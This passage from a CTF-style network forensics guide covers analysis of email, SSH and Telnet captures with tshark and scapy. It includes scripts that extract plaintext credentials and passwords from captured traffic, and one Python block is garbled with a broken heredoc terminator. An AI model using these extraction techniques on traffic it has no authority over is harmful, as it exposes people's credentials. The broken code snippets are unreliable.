tshark -r capture.pcap -Y "smtp.data.fragment" -T fields -e smtp.data.fragment | \
xxd -r -p > email_raw.eml

# Parse with python or mail client
```

### POP3 Analysis

**Wireshark Display Filters:**

```
pop                                # All POP3 traffic
pop.request                        # Client commands
pop.response                       # Server responses
```

**Key POP3 Commands:**

```
USER [username]       # Authenticate username
PASS [password]       # Authenticate password (plaintext!)
STAT                  # Mailbox status
LIST                  # List messages
RETR [n]             # Retrieve message n
DELE [n]             # Delete message n
QUIT                 # End session
```

**Credential Extraction:**

```
pop.request.command == "USER" || pop.request.command == "PASS"
```

Follow TCP stream to view plaintext credentials.

**Email Retrieval:**

```
pop.request.command == "RETR"
```

**Extract Email Content:**

```bash
# Filter for RETR command and subsequent data
tshark -r capture.pcap -Y "pop" -T fields -e tcp.stream | sort -u

# Follow specific stream containing RETR command
tshark -r capture.pcap -Y "tcp.stream eq [N]" -w pop_session.pcap

# Export as text
tshark -r pop_session.pcap -T fields -e text > retrieved_email.txt
```

### IMAP Analysis

**Wireshark Display Filters:**

```
imap                              # All IMAP traffic
imap.request                      # Client commands
imap.response                     # Server responses
```

**Key IMAP Commands:**

```
LOGIN [user] [pass]              # Plaintext authentication
AUTHENTICATE                     # SASL authentication
SELECT [mailbox]                 # Select mailbox
FETCH [n] BODY[]                 # Fetch message n
SEARCH                           # Search mailbox
LOGOUT                           # End session
```

**Credential Extraction:**

```
imap.request contains "LOGIN"
```

[Unverified] IMAP LOGIN may be followed by two arguments in the same line or split across packets depending on client implementation.

**Email Extraction:**

```
imap.request contains "FETCH"
```

**Extract IMAP Email:**

```bash
# Identify FETCH commands
tshark -r capture.pcap -Y "imap.request contains \"FETCH\"" \
  -T fields -e imap.request

# Follow TCP stream of FETCH response
# Email content follows FETCH BODY[] response
```

### Encrypted Email Protocols (STARTTLS)

**Identifying STARTTLS Upgrade:**

```
smtp.req.command == "STARTTLS" || 
pop.request.command == "STLS" || 
imap.request contains "STARTTLS"
```

After STARTTLS command, traffic becomes TLS-encrypted. Analysis requires:

1. **Session Key Extraction** [Unverified - requires specific conditions]:
    
    - SSLKEYLOGFILE environment variable set on client
    - Access to server private keys
    - Active MITM with key extraction
2. **Pre-Authentication Analysis**:
    
    - Credentials/content before STARTTLS remain plaintext
    - Filter: `frame.number < [STARTTLS_FRAME]`
3. **Certificate Analysis**:
    

```
ssl.handshake.certificate
```

Examine certificate details for information disclosure (CN, SAN, Issuer).

### Email Header Forensics

**Trace Email Path:**

```bash
# Extract all Received headers
tshark -r capture.pcap -Y "smtp" -T fields -e text | \
grep "^Received:" | tac
```

Read from bottom to top to trace the email's journey through mail servers.

**Identify Spoofed Emails:**

- Compare "From:" header with "Return-Path:"
- Check SPF/DKIM/DMARC headers (if present)
- Analyze "Received:" headers for suspicious relays

**Extract URLs/IPs:**

```bash
tshark -r capture.pcap -Y "smtp" -T fields -e text | \
grep -Eo '(http|https)://[a-zA-Z0-9./?=_-]*'

tshark -r capture.pcap -Y "smtp" -T fields -e text | \
grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
```

### Advanced Email Analysis Techniques

**Reconstructing Email Threads:**

```bash
# Group by Message-ID and In-Reply-To headers
tshark -r capture.pcap -Y "smtp" -T fields \
  -e text | grep -E "(Message-ID|In-Reply-To|References):"
```

**Detecting Exfiltration via Email:**

```
# Large outbound emails
smtp.req.command == "DATA" && tcp.len > 5000

# High frequency of outbound emails
# (Statistical analysis in tshark)
```

**Time-based Analysis:**

```bash
# Extract timestamps of all emails
tshark -r capture.pcap -Y "smtp.req.command == \"DATA\"" \
  -T fields -e frame.time

# Pattern detection (requires additional analysis)
```

### Common CTF Email Scenarios

**Scenario 1: Hidden Data in Email Headers** Custom X-headers may contain encoded flags:

```bash
tshark -r capture.pcap -Y "smtp" -T fields -e text | \
grep "^X-"
```

Decode common encodings:

```bash
# Base64
echo "flag_data" | base64 -d

# Hex
echo "666c6167" | xxd -r -p

# ROT13
echo "synt" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

**Scenario 2: Steganography in Email Attachments** After extracting attachments:

```bash
# Strings analysis
strings attachment.jpg

# Steghide extraction
steghide extract -sf attachment.jpg

# Binwalk for embedded files
binwalk -e attachment.jpg

# Stegsolve (GUI tool)
java -jar stegsolve.jar
```

**Scenario 3: Malicious Payload Analysis** Extracted attachments may be malware samples:

```bash
# Safe analysis
file malicious.exe
strings malicious.exe
exiftool malicious.exe

# Calculate hashes
md5sum malicious.exe
sha256sum malicious.exe

# VirusTotal lookup (if online)
# [Inference] VT API or web interface can identify known malware
```

**Scenario 4: Email Authentication Bypass** Look for:

- Missing/invalid authentication
- AUTH PLAIN with observable credentials
- Open relay indicators (missing authentication for MAIL FROM)

### Tool Recommendations

**Wireshark** - Primary packet analysis **tshark** - Command-line automation **NetworkMiner** - Automated file/email extraction  
**mutt/alpine** - Email client to view extracted .eml files **emailparse (Python)** - Programmatic email parsing **foremost/scalpel** - File carving from raw data **CyberChef** - Encoding/decoding operations

### Important Subtopics for Further Study

- **S/MIME and PGP encrypted emails** - Encrypted email analysis techniques
- **MIME exploitation techniques** - Malformed MIME structures used for evasion
- **Email header injection attacks** - SMTP command injection and header manipulation
- **DKIM/SPF/DMARC forensics** - Authentication header analysis for anti-spoofing

---

## SSH Traffic Patterns

### Understanding SSH Protocol Structure

SSH operates on TCP port 22 by default and consists of three main protocol layers:

1. **Transport Layer Protocol**: Encryption, server authentication, integrity
2. **User Authentication Protocol**: Client authentication
3. **Connection Protocol**: Multiplexing encrypted tunnel into logical channels

**SSH Handshake Sequence:**

```
Client → Server: TCP SYN
Server → Client: TCP SYN-ACK
Client → Server: TCP ACK
Client ↔ Server: Protocol Version Exchange (cleartext)
Client ↔ Server: Key Exchange Init
Client ↔ Server: Key Exchange (Diffie-Hellman)
Client ↔ Server: New Keys
Client → Server: Service Request (ssh-userauth)
Client → Server: Authentication Request
Server → Client: Authentication Response
[Encrypted Session Traffic]
```

### SSH Traffic Identification

```bash
# Basic SSH traffic filtering
tshark -r capture.pcap -Y "tcp.port == 22"

# SSH on non-standard ports (pattern matching)
tshark -r capture.pcap -Y "tcp" -T fields -e tcp.dstport -e data.data | \
grep -E "5353482d"  # "SSH-" in hex

# Identify SSH version exchange (cleartext)
tshark -r capture.pcap -Y "tcp.port == 22 && tcp.len > 0" -T fields -e tcp.payload | \
head -5 | xxd -r -p | strings

# Extract SSH banner
tshark -r capture.pcap -Y "tcp.port == 22" -T fields -e tcp.payload | \
while read payload; do
    echo $payload | xxd -r -p 2>/dev/null | strings | grep "^SSH-"
done | sort -u
```

### SSH Protocol Version Detection

```bash
# Detect SSH protocol versions
tshark -r capture.pcap -Y "tcp.port == 22" -x | \
grep -A 2 "SSH-" | grep -oE "SSH-[0-9]\.[0-9]+-[^ ]+"

# Automated SSH version extraction
python3 << 'EOF'
from scapy.all import *

packets = rdpcap('capture.pcap')

ssh_versions = set()
for pkt in packets:
    if TCP in pkt and (pkt[TCP].dport == 22 or pkt[TCP].sport == 22):
        if Raw in pkt:
            payload = bytes(pkt[Raw].load)
            if b'SSH-' in payload:
                try:
                    version = payload.split(b'\r\n')[0].decode('ascii')
                    ssh_versions.add(version)
                except:
                    pass

print("SSH Versions detected:")
for v in ssh_versions:
    print(f"  {v}")
EOF
```

### SSH Connection Analysis

```bash
# Count SSH connections
tshark -r capture.pcap -Y "tcp.port == 22 && tcp.flags.syn == 1 && tcp.flags.ack == 0" | wc -l

# SSH connection duration analysis
tshark -r capture.pcap -qz conv,tcp | grep ":22 " | awk '{print $NF}' | \
awk '{sum+=$1; count++} END {print "Avg duration:", sum/count, "sec"}'

# Identify SSH connection endpoints
tshark -r capture.pcap -Y "tcp.port == 22" -T fields -e ip.src -e ip.dst | \
sort -u | awk '{print $1, "->", $2}'

# SSH connection timeline
tshark -r capture.pcap -Y "tcp.port == 22 && tcp.flags.syn == 1" -T fields \
-e frame.time -e ip.src -e ip.dst -e tcp.srcport
```

### SSH Key Exchange Analysis

```bash
# Extract SSH handshake packets
tshark -r capture.pcap -Y "tcp.port == 22 && tcp.len > 100 && tcp.len < 2000" \
-w ssh_handshake.pcap

# Analyze key exchange methods (requires SSH dissector)
tshark -r capture.pcap -Y "ssh" -T fields -e ssh.kex.algorithms

# Encryption algorithm detection
tshark -r capture.pcap -Y "ssh" -T fields -e ssh.encryption_algorithms_client_to_server

# MAC algorithm detection
tshark -r capture.pcap -Y "ssh" -T fields -e ssh.mac_algorithms_client_to_server

# Compression methods
tshark -r capture.pcap -Y "ssh" -T fields -e ssh.compression_algorithms_client_to_server
```

### SSH Encrypted Traffic Characteristics

**Packet Size Analysis:**

```bash
# SSH session packet size distribution
tshark -r capture.pcap -Y "tcp.port == 22 && tcp.len > 0" -T fields -e tcp.len | \
awk '{
    if($1<=64) s64++
    else if($1<=128) s128++
    else if($1<=256) s256++
    else if($1<=512) s512++
    else if($1<=1024) s1024++
    else s1500++
}
END {
    print "Tiny (≤64):", s64
    print "Small (65-128):", s128  
    print "Medium (129-256):", s256
    print "Large (257-512):", s512
    print "XLarge (513-1024):", s1024
    print "Jumbo (>1024):", s1500
}'

# Interactive vs bulk transfer detection
# [Inference] Small packets (~48-64 bytes) suggest interactive terminal
# [Inference] Large packets suggest file transfers
tshark -r capture.pcap -Y "tcp.port == 22" -T fields -e tcp.stream -e tcp.len | \
awk '{
    stream[$1]++
    if($2 < 100) small[$1]++
    else large[$1]++
}
END {
    for(s in stream) {
        if(small[s] > large[s] * 10) 
            print "Stream", s, "likely interactive"
        else if(large[s] > small[s])
            print "Stream", s, "likely bulk transfer"
    }
}'
```

### SSH Timing Analysis

```bash
# Inter-packet arrival times (keystroke timing)
tshark -r capture.pcap -Y "tcp.port == 22 && tcp.len > 0" -T fields \
-e frame.time_delta -e tcp.len -e ip.src > ssh_timing.txt

# Analyze for interactive patterns
awk '$2 < 100 {print $1}' ssh_timing.txt | \
awk '{sum+=$1; count++} END {print "Avg inter-packet delay:", sum/count*1000, "ms"}'

# Detect automated sessions vs human interaction
# [Inference] Human typing: 50-200ms between keystrokes
# [Inference] Automated: Very regular or very fast patterns
python3 << 'EOF'
import statistics

with open('ssh_timing.txt') as f:
    delays = [float(line.split()[0]) for line in f if line.strip()]

if delays:
    mean = statistics.mean(delays) * 1000
    stdev = statistics.stdev(delays) * 1000 if len(delays) > 1 else 0
    
    print(f"Mean delay: {mean:.2f} ms")
    print(f"Std deviation: {stdev:.2f} ms")
    
    if stdev < 5 and mean < 100:
        print("[Inference] Pattern suggests automated/scripted session")
    elif 50 < mean < 200 and stdev > 20:
        print("[Inference] Pattern suggests human interactive session")
EOF
```

### SSH Brute Force Detection

```bash
# Count failed connection attempts
tshark -r capture.pcap -Y "tcp.port == 22 && tcp.flags.reset == 1" | wc -l

# Rapid connection attempts from same source
tshark -r capture.pcap -Y "tcp.port == 22 && tcp.flags.syn == 1" -T fields \
-e ip.src -e frame.time_epoch | \
awk '{
    if($1 == prev_ip && $2 - prev_time < 2) {
        count[$1]++
    }
    prev_ip = $1
    prev_time = $2
}
END {
    for(ip in count) {
        if(count[ip] > 10)
            print "Potential brute force from", ip, "with", count[ip], "rapid attempts"
    }
}'

# Short-lived connections (authentication failures)
tshark -r capture.pcap -qz conv,tcp | grep ":22 " | \
awk '$NF < 1 {print "Short connection:", $0}'
```

### SSH Traffic Statistics

```bash
# SSH bandwidth usage
tshark -r capture.pcap -Y "tcp.port == 22" -T fields -e frame.len | \
awk '{sum+=$1} END {print "Total SSH traffic:", sum/1024/1024, "MB"}'

# Upload vs download ratio
tshark -r capture.pcap -Y "tcp.port == 22" -T fields -e ip.src -e tcp.len | \
awk '
    /192.168.1.10/ {upload+=$2}  # Adjust to your client IP
    !/192.168.1.10/ {download+=$2}
END {
    print "Upload:", upload/1024, "KB"
    print "Download:", download/1024, "KB"
    print "Ratio:", download/upload
}'

# Packets per SSH stream
tshark -r capture.pcap -Y "tcp.port == 22" -T fields -e tcp.stream | \
sort | uniq -c | awk '{print "Stream", $2, "has", $1, "packets"}'
```

### SSH Tunneling Detection

[Inference] SSH tunneling may show specific traffic patterns but cannot be definitively identified without decryption.

```bash
# Detect potential SSH tunneling (sustained high bandwidth)
tshark -r capture.pcap -Y "tcp.port == 22" -T fields -e tcp.stream -e frame.len | \
awk '{bytes[$1]+=$2; count[$1]++} 
END {
    for(s in bytes) {
        if(bytes[s] > 1000000)  # >1MB
            print "Stream", s, "transferred", bytes[s]/1024/1024, "MB - potential tunnel"
    }
}'

# Look for SSH on multiple ports (port forwarding)
tshark -r capture.pcap -Y "tcp" -T fields -e tcp.payload | \
while read payload; do
    if echo $payload | xxd -r -p 2>/dev/null | strings | grep -q "^SSH-"; then
        echo "SSH detected in payload"
    fi
done | uniq -c
```

### SSH Session Reconstruction

**Extract SSH handshake for analysis:**

```python
#!/usr/bin/env python3
from scapy.all import *

pcap = rdpcap('capture.pcap')

# Group by TCP stream
streams = {}
for pkt in pcap:
    if TCP in pkt and (pkt[TCP].dport == 22 or pkt[TCP].sport == 22):
        key = (pkt[IP].src, pkt[TCP].sport, pkt[IP].dst, pkt[TCP].dport)
        if key not in streams:
            streams[key] = []
        streams[key].append(pkt)

# Analyze first few packets of each stream
for stream_id, (key, packets) in enumerate(streams.items()):
    print(f"\n=== Stream {stream_id}: {key[0]}:{key[1]} -> {key[2]}:{key[3]} ===")
    
    for i, pkt in enumerate(packets[:10]):  # First 10 packets
        if Raw in pkt:
            payload = bytes(pkt[Raw].load)
            if b'SSH-' in payload:
                print(f"Packet {i}: {payload[:50]}")
            else:
                print(f"Packet {i}: {len(payload)} encrypted bytes")
```

### SSH-Specific CTF Techniques

**Finding SSH keys in traffic:**

```bash
# Search for SSH key patterns (shouldn't be in traffic, but check)
tshark -r capture.pcap -T fields -e tcp.payload | \
while read payload; do
    echo $payload | xxd -r -p 2>/dev/null | strings | grep -E "BEGIN.*PRIVATE KEY"
done

# Extract base64-like sequences (potential key material)
tshark -r capture.pcap -Y "tcp.port == 22" -T fields -e tcp.payload | \
xxd -r -p | strings | grep -E "^[A-Za-z0-9+/]{40,}={0,2}$"
```

**SSH traffic anomalies:**

```bash
# Unusual SSH packet sizes
tshark -r capture.pcap -Y "tcp.port == 22 && tcp.len > 8000" -T fields \
-e frame.number -e tcp.len -e ip.src -e ip.dst

# SSH on unusual ports
tshark -r capture.pcap -Y "tcp.flags.syn == 1" -T fields -e tcp.dstport | \
sort | uniq -c | grep -v "^.*22$"
```

### SSH Session Metadata Extraction

```bash
#!/bin/bash
# Comprehensive SSH session analysis

PCAP="$1"
OUTPUT="ssh_analysis.txt"

echo "=== SSH Traffic Analysis ===" > $OUTPUT
echo "Capture: $PCAP" >> $OUTPUT
echo "" >> $OUTPUT

# SSH versions
echo "=== SSH Versions ===" >> $OUTPUT
tshark -r $PCAP -Y "tcp.port == 22" -x | \
grep -oE "SSH-[0-9]\.[0-9]+-[^ ]+" | sort -u >> $OUTPUT
echo "" >> $OUTPUT

# Connection summary
echo "=== SSH Connections ===" >> $OUTPUT
tshark -r $PCAP -qz conv,tcp | grep ":22" >> $OUTPUT
echo "" >> $OUTPUT

# Timing statistics
echo "=== Timing Statistics ===" >> $OUTPUT
tshark -r $PCAP -Y "tcp.port == 22 && tcp.len > 0" -T fields -e tcp.len | \
awk '{
    sum+=$1
    count++
    if($1 < 100) small++
    else large++
}
END {
    print "Total packets:", count
    print "Small packets (<100):", small
    print "Large packets (≥100):", large
    print "Average packet size:", sum/count, "bytes"
}' >> $OUTPUT

echo "" >> $OUTPUT
echo "Analysis complete. Results in $OUTPUT"
```

## Telnet Cleartext Analysis

### Telnet Protocol Overview

Telnet operates on TCP port 23 and transmits all data in cleartext, including credentials. It uses a negotiation protocol for terminal options.

**Telnet Protocol Structure:**

- Commands start with IAC (Interpret As Command): 0xFF
- Option negotiation: WILL, WONT, DO, DONT
- All user input and output is plaintext

### Telnet Traffic Identification

```bash
# Basic Telnet filtering
tshark -r capture.pcap -Y "tcp.port == 23"

# Telnet on non-standard ports
tshark -r capture.pcap -Y "telnet"

# Count Telnet sessions
tshark -r capture.pcap -Y "tcp.port == 23 && tcp.flags.syn == 1 && tcp.flags.ack == 0" | wc -l

# Identify Telnet endpoints
tshark -r capture.pcap -Y "tcp.port == 23" -T fields -e ip.src -e ip.dst | sort -u
```

### Telnet Session Extraction

```bash
# Extract complete Telnet stream
tshark -r capture.pcap -Y "tcp.port == 23" -T fields -e tcp.stream | sort -u

# Follow first Telnet stream
tshark -r capture.pcap -z follow,tcp,ascii,0 -Y "tcp.port == 23"

# Extract all Telnet streams
for stream in $(tshark -r capture.pcap -Y "tcp.port == 23" -T fields -e tcp.stream | sort -u); do
    echo "=== Telnet Stream $stream ===" > telnet_stream_$stream.txt
    tshark -r capture.pcap -z follow,tcp,ascii,$stream >> telnet_stream_$stream.txt 2>&1
done
```

### Credential Extraction from Telnet

```bash
# Extract Telnet payloads
tshark -r capture.pcap -Y "tcp.port == 23 && tcp.len > 0" -T fields -e tcp.payload | \
xxd -r -p > telnet_raw.txt

# Filter for common login prompts
strings telnet_raw.txt | grep -iE "(login|username|password):"

# Extract credentials using pattern matching
tshark -r capture.pcap -Y "tcp.port == 23" -T fields -e tcp.payload | \
while read payload; do
    echo $payload | xxd -r -p 2>/dev/null
done | strings | grep -A 1 -iE "(login|username|password):"

# Automated credential extraction
python3 << 'EOF'
from scapy.all import *

pcap = rdpcap('capture.pcap')

# Track Telnet streams
streams = {}
for pkt in pcap:
    if TCP in pkt and (pkt[TCP].dport == 23 or pkt[TCP].sport == 23):
        stream_id = (pkt[IP].src, pkt[TCP].sport, pkt[IP].dst, pkt[TCP].dport)
        
        if stream_id not in streams:
            streams[stream_id] = []
        
        if Raw in pkt:
            payload = bytes(pkt[Raw].load)
            streams[stream_id].append(payload)

# Search for credentials
for stream_id, payloads in streams.items():
    combined = b''.join(payloads)
    text = combined.decode('latin-1', errors='ignore')
    
    if 'login' in text.lower() or 'password' in text.lower():
        print(f"\n=== Potential credentials in stream {stream_id[0]}:{stream_id[1]} -> {stream_id[2]}:{stream_id[3]} ===")
        print(text[:500])  # First 500 chars
EOF
```

### Telnet Command Extraction

```bash
# Extract user commands (filter out control characters)
tshark -r capture.pcap -Y "tcp.port == 23 && tcp.len > 0" -T fields -e tcp.payload | \
xxd -r -p | strings | grep -v "^$" > telnet_commands.txt

# Filter for actual commands (remove echoes and prompts)
cat telnet_commands.txt | grep -E "^(ls|cd|cat|pwd|whoami|id|uname)" > user_commands.txt

# Extract commands with timestamps
tshark -r capture.pcap -Y "tcp.port == 23 && tcp.len > 0" -T fields \
-e frame.time -e ip.src -e tcp.payload | \
while IFS=$'\t' read time src payload; do
    cmd=$(echo $payload | xxd -r -p 2>/dev/null | strings | head -1)
    if [ ! -z "$cmd" ]; then
        echo "$time | $src | $cmd"
    fi
done > telnet_timeline.txt
```

### Telnet Option Negotiation Analysis

```bash
# Telnet IAC commands (0xFF)
tshark -r capture.pcap -Y "tcp.port == 23" -T fields -e tcp.payload | \
while read payload; do
    if echo $payload | grep -q "^ff"; then
        echo "IAC command: $payload"
    fi
done

# Decode Telnet options
python3 << 'EOF'
from scapy.all import *

IAC = 255  # Interpret As Command
WILL = 251
WONT = 252
DO = 253
DONT = 254

TELNET_OPTIONS = {
    0: "Binary Transmission",
    1: "Echo",
    3: "Suppress Go Ahead",
    5: "Status",
    6: "Timing Mark",
    24: "Terminal Type",
    31: "Window Size",
    32: "Terminal Speed",
    33: "Remote Flow Control",
    34: "Linemode",
    36: "Environment Variables"
}

packets = rdpcap('capture.pcap')

for pkt in packets:
    if TCP in pkt and (pkt[TCP].dport == 23 or pkt[TCP].sport == 23):
        if Raw in pkt:
            payload = bytes(pkt[Raw].load)
            i = 0
            while i < len(payload):
                if payload[i] == IAC and i + 2 < len(payload):
                    cmd = payload[i+1]
                    opt = payload[i+2]
                    
                    cmd_name = {WILL: "WILL", WONT: "WONT", DO: "DO", DONT: "DONT"}.get(cmd, f"0x{cmd:02x}")
                    opt_name = TELNET_OPTIONS.get(opt, f"Unknown (0x{opt:02x})")
                    
                    print(f"IAC {cmd_name} {opt_name}")
                    i += 3
                else:
                    i += 1
EOF
```

### Telnet Session Reconstruction

**Complete session playback:**

```python
#!/usr/bin/env python3
from scapy.all import *
import sys

def clean_telnet_data(data):
    """Remove Telnet control sequences"""
    result = bytearray()
    i = 0
    while i < len(data):
        if data[i] == 0xFF:  # IAC
            # Skip IAC command (usually 3 bytes)
            i += 3 if i + 2 < len(data) else 1
        elif data[i] in [0x00, 0x0D]:  # NULL, CR
            i += 1
        else:
            result.append(data[i])
            i += 1
    return bytes(result)

def reconstruct_telnet_session(pcap_file, stream_number=None):
    packets = rdpcap(pcap_file)
    
    # Group by stream
    streams = {}
    for pkt in packets:
        if TCP in pkt and (pkt[TCP].dport == 23 or pkt[TCP].sport == 23):
            stream = pkt[TCP].stream if hasattr(pkt[TCP], 'stream') else 0
            
            if stream_number is not None and stream != stream_number:
                continue
            
            if stream not in streams:
                streams[stream] = {'client': [], 'server': []}
            
            if Raw in pkt:
                direction = 'client' if pkt[TCP].dport == 23 else 'server'
                streams[stream][direction].append({
                    'seq': pkt[TCP].seq,
                    'time': float(pkt.time),
                    'data': bytes(pkt[Raw].load)
                })
    
    # Reconstruct each stream
    for stream_id, data in streams.items():
        print(f"\n{'='*60}")
        print(f"Telnet Stream {stream_id}")
        print(f"{'='*60}\n")
        
        # Sort by sequence number
        client_data = sorted(data['client'], key=lambda x: x['seq'])
        server_data = sorted(data['server'], key=lambda x: x['seq'])
        
        # Merge and sort by time
        all_data = []
        for pkt in client_data:
            all_data.append(('CLIENT', pkt['time'], pkt['data']))
        for pkt in server_data:
            all_data.append(('SERVER', pkt['time'], pkt['data']))
        
        all_data.sort(key=lambda x: x[1])
        
        # Display session
        for direction, timestamp, payload in all_data:
            cleaned = clean_telnet_data(payload)
            if cleaned:
                text = cleaned.decode('latin-1', errors='replace')
                print(f"[{direction}] {text}", end='')
        
        print("\n")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python3 telnet_reconstruct.py capture.pcap [stream_number]")
        sys.exit(1)
    
    stream = int(sys.argv[2]) if len(sys.argv) > 2 else None
    reconstruct_telnet_session(sys.argv[1], stream)
```

### Telnet Traffic Statistics

```bash
# Session duration
tshark -r capture.pcap -qz conv,tcp | grep ":23 "

# Data volume per session
tshark -r capture.pcap -Y "tcp.port == 23" -T fields -e tcp.stream -e frame.len | \
awk '{bytes[$1]+=$2} END {for(s in bytes) print "Stream", s":", bytes[s], "bytes"}'

# Packet frequency (interactive vs bulk)
tshark -r capture.pcap -Y "tcp.port == 23" -T fields -e tcp.stream -e tcp.len | \
awk '{
    count[$1]++
    if($2 < 10) small[$1]++
}
END {
    for(s in count) {
        pct = (small[s] / count[s]) * 100
        print "Stream", s":", pct"% small packets"
        if(pct > 80) print "  → Likely interactive session"
    }
}'
```

### Telnet Security Analysis

```bash
# Identify failed login attempts
tshark -r capture.pcap -Y "tcp.port == 23" -T fields -e tcp.payload | \
xxd -r -p | strings | grep -iE "(failed|incorrect|denied|invalid)"

# Extract successful login indicators
tshark -r capture.pcap -Y "tcp.port == 23" -T fields -e tcp.payload | \
xxd -r -p | strings | grep -iE "(welcome|last login|#|\$)"

# Detect password patterns
tshark -r capture.pcap -Y "tcp.port == 23 && tcp.len > 0 && tcp.len < 50" -T fields -e tcp.payload | \
while read payload; do
    text=$(echo $payload | xxd -r -p 2>/dev/null | tr -cd '[:print:]')
    if [ ${#text} -ge 6 ] && [ ${#text} -le 20 ]; then
        echo "Potential password: $text"
    fi
done | sort -u
```

### Comparing Telnet Sessions

```bash
# Extract multiple sessions for comparison
for stream in $(tshark -r capture.pcap -Y "tcp.port == 23" -T fields -e tcp.stream | sort -u); do
    tshark -r capture.pcap -Y "tcp.stream eq $stream" -T fields -e tcp.payload | \
    xxd -r -p | strings > session_$stream.txt
    
    echo "Session $stream:"
    head -20 session_$stream.txt
    echo "---"
done

# Find common commands across sessions
cat session_*.txt | grep -E "^(ls|cd|cat|pwd)" | sort | uniq -c | sort -rn
```

### Telnet vs SSH Comparison Script

```bash
#!/bin/bash
PCAP="$1"

echo "=== Protocol Security Analysis ==="
echo ""

# Telnet analysis
TELNET_COUNT=$(tshark -r $PCAP -Y "tcp.port == 23" | wc -l)
TELNET_CREDS=$(tshark -r $PCAP -Y "tcp.port == 23" -T fields -e tcp.payload | \
               xxd -r -p 2>/dev/null | strings | grep -iE "(password|login)" | wc -l)

echo "Telnet Traffic:"
echo "  Packets: $TELNET_COUNT"
echo "  Credential prompts found: $TELNET_CREDS"
echo "  Security: CLEARTEXT - credentials visible"
echo ""

# SSH analysis  
SSH_COUNT=$(tshark -r $PCAP -Y "tcp.port == 22" | wc -l)

echo "SSH Traffic:"
echo "  Packets: $SSH_COUNT"
echo "  Security: ENCRYPTED - credentials protected"
echo ""

if [ $TELNET_COUNT -gt 0 ]; then
    echo "[WARNING] Telnet traffic detected - credentials may be compromised"
fi
```

### CTF-Specific Telnet Techniques

**Hidden data in Telnet streams:**

```bash
# Look for base64 encoded data
tshark -r capture.pcap -Y "tcp.port == 23" -T fields -e tcp.payload | \
xxd -r -p | strings | grep -E "^[A-Za-z0-9+/]{20,}={0,2}$" | \
while read b64; do
    decoded=$(echo $b64 | base64 -d 2>/dev/null)
    if [ $? -eq 0 ]; then
        echo "Found base64: $decoded"
    fi
done

# Extract hex patterns
tshark -r capture.pcap -Y "tcp.port == 23" -T fields -e tcp.payload | \
xxd -r -p | strings | grep -E "^[0-9a-fA-F]{32,}$"

# Look for flag patterns
tshark -r capture.pcap -Y "tcp.port == 23" -T fields -e tcp.payload | \
xxd -r -p | strings | grep -E "(flag|ctf|FLAG|CTF)\{[^}]+\}"
```

**Telnet data carving:**

```python
#!/usr/bin/env python3
import re
from scapy.all import *

pcap = rdpcap('capture.pcap')

all_telnet_data = b''
for pkt in pcap:
    if TCP in pkt and (pkt[TCP].dport == 23 or pkt[TCP].sport == 23):
        if Raw in pkt:
            all_telnet_data += bytes(pkt[Raw].load)

# Remove control characters
printable = bytes([b for b in all_telnet_data if 32 <= b < 127 or b in [10, 13]])

# Search for patterns
text = printable.decode('latin-1', errors='ignore')

# Look for common flag formats
flags = re.findall(r'(flag|ctf|FLAG|CTF)\{[^}]+\}', text, re.IGNORECASE)
if flags:
    print("Flags found:")
    for flag in flags:
        print(f"  {flag}")

# Look for file contents
if 'BEGIN' in text and 'END' in text:
    print("\nPotential file/key content detected")

# Look for credentials
creds = re.findall(r'(username|user|login)[:=]\s*(\w+)', text, re.IGNORECASE)
passwords = re.findall(r'(password|pass|pwd)[:=]\s*(\S+)', text, re.IGNORECASE)

if creds:
    print("\nUsernames found:")
    for match in creds:
        print(f"  {match[1]}")

if passwords:
    print("\nPasswords found:")
    for match in passwords:
        print(f"  {match[1]}")
```

### Telnet Session Timeline Visualization

```bash
# Create timeline of Telnet activity
tshark -r capture.pcap -Y "tcp.port == 23" -T fields \
-e frame.time -e ip.src -e ip.dst -e tcp.len -e tcp.flags | \
awk -F'\t' '
BEGIN {print "Time,Source,Destination,Length,Flags"} {print $1","$2","$3","$4","$5}' > telnet_timeline.csv

# Analyze for suspicious patterns

python3 << 'EOF' 
import csv from datetime 
import datetime from collections 
import defaultdict

sessions = defaultdict(list)

import csv
from collections import defaultdict

# Initialize a dictionary to store session data
sessions = defaultdict(list)

# Open and read the CSV file
with open('telnet_timeline.csv') as f:
    reader = csv.DictReader(f)
    for row in reader:
        # Check if 'Length' is present and greater than 0
        if 'Length' in row and int(row['Length']) > 0:
            # Create a key for the session based on Source and Destination
            key = f"{row['Source']}->{row['Destination']}"
            # Append the packet data to the session
            sessions[key].append({
                'time': row['Time'],
                'length': int(row['Length'])
            })

# Print session activity statistics
print("=== Telnet Session Activity ===\n")
for session, packets in sessions.items():
    # Calculate total bytes for the session
    total_bytes = sum(p['length'] for p in packets)
    
    # Print session details
    print(f"Session: {session}")
    print(f" Packets: {len(packets)}")
    print(f" Total data: {total_bytes} bytes")
    print(f" First packet: {packets[0]['time']}")
    print(f" Last packet: {packets[-1]['time']}")
    print()
OEF
````

### Advanced Telnet Payload Analysis

**Character-by-character reconstruction:**

```python
#!/usr/bin/env python3
from scapy.all import *
import sys

def analyze_telnet_keystrokes(pcap_file):
    """
    Analyze Telnet traffic character by character
    Useful for password reconstruction
    """
    packets = rdpcap(pcap_file)
    
    streams = {}
    for pkt in packets:
        if TCP in pkt and pkt[TCP].dport == 23:  # Client to server
            stream_id = (pkt[IP].src, pkt[TCP].sport, pkt[IP].dst, pkt[TCP].dport)
            
            if stream_id not in streams:
                streams[stream_id] = []
            
            if Raw in pkt:
                payload = bytes(pkt[Raw].load)
                # Filter out Telnet control characters
                for byte in payload:
                    if 32 <= byte < 127:  # Printable ASCII
                        streams[stream_id].append(chr(byte))
                    elif byte == 0x08:  # Backspace
                        if streams[stream_id]:
                            streams[stream_id].pop()
                    elif byte == 0x0D:  # Enter
                        streams[stream_id].append('\n')
    
    # Display reconstructed input
    for stream_id, chars in streams.items():
        print(f"\n=== Client Input: {stream_id[0]}:{stream_id[1]} -> {stream_id[2]}:{stream_id[3]} ===")
        text = ''.join(chars)
        
        # Split by newlines to show commands
        lines = text.split('\n')
        for i, line in enumerate(lines):
            if line.strip():
                print(f"Command {i+1}: {line}")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python3 telnet_keystrokes.py capture.pcap")
        sys.exit(1)
    
    analyze_telnet_keystrokes(sys.argv[1])
````

### Telnet Protocol Dissection

**Understanding Telnet escape sequences:**

```bash
# Extract raw Telnet data with control codes visible
